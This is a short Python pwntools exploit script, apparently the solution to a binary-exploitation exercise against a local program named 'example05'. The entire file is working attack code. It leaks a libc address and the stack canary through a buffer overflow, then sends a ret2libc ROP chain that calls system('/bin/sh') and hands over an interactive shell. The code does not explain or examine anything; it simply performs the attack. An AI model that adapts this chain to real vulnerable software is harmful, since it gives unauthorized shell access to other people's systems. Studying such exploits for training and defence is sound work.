from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

p = process("./example05")

gdb.attach(p)

binary = ELF("./example05")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")

setvbuf_addr = int(p.recvline()[2:], 16)
print('setvbuf_addr', hex(setvbuf_addr))

libc_base = setvbuf_addr - libc.symbols['setvbuf']

p.sendline('A' * 41)

leak = b'\x00' + p.recvline()[-14:-7]
print(hex(u64(leak)))

system = libc_base + libc.symbols['system']
pop_rdi = libc_base + libc_rop.find_gadget(['pop rdi', 'ret']).address
ret = libc_base + libc_rop.find_gadget(['ret']).address
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = b''
payload += b'A' * 40
payload += leak
payload += b'A' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

p.sendline(payload)

p.sendline("exit")

p.interactive()
